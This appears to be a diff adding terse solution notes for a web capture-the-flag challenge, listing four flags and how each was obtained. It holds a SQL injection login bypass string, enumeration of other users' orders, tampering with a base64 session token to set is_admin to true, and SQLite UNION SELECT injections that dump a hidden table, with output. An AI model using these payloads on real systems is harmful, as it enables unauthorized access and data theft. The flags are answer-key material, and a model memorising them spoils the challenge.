@@ -1,0 +1,22 @@
+1 flag “Welcome flag hunters: c61a99b4acdade9373d766b50f993528a451ecb326dd1924e385230d9165181d” 
+username=xxx' or '1'='1&password=xxx' or '1'='1
+
+2 flag a57c4d7b437aa755b3cdf6d85c5d1403e2f8c282b899bc3377e0409c13c5ea08:
+Inspect 1-100 orders , get WLoman order datails' flag. (53) 
+
+3 flag “Welcome admin flag hunters: 1df940fed504b48e1dc80203d2c0cadcb95dafdaae9d2b609537e1d9b972b325” 
+
+In [1]: x='SkJha2VyOmlzX2FkbWluPUZhbHNlOjIwMTUtMDMtMDQgMTA6MTU6MzQzOTgzNzNiNGU3MzEwYmE1OTk3NjYwY2Y3NjhiNTI='
+In [2]: x.decode('base64')
+Out[2]: 'JBaker:is_admin=False:2015-03-04 10:15:34398373b4e7310ba5997660cf768b52' --change to true,encode and submit. 
+
+
+4 flag - sqlite_master sqli 
+$ python sqlite.py "' UNION SELECT tbl_name,null,null FROM sqlite_master-- -"
+ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle:is_admin=False:2015-03-09 12:44:800f545306a9f90c2bfafc7092defc97
+$ python sqlite.py "' UNION SELECT sql,null,null FROM sqlite_master-- -"
+CREATE TABLE `ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle` (
+    `flag`    TEXT
+):is_admin=False:2015-03-09 12:44:2f4b26f2f202dcd309adda32d7a11817
+$ python sqlite.py "' UNION SELECT flag,null,null FROM ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle-- -"
+ca04e38f193095e3a14c4a4e62f11e1d30ee7d202d6efd66345385d3f60701b8:is_admin=False:2015-03-09 12:45:ee393cb32a21864337928d0233d20ad0
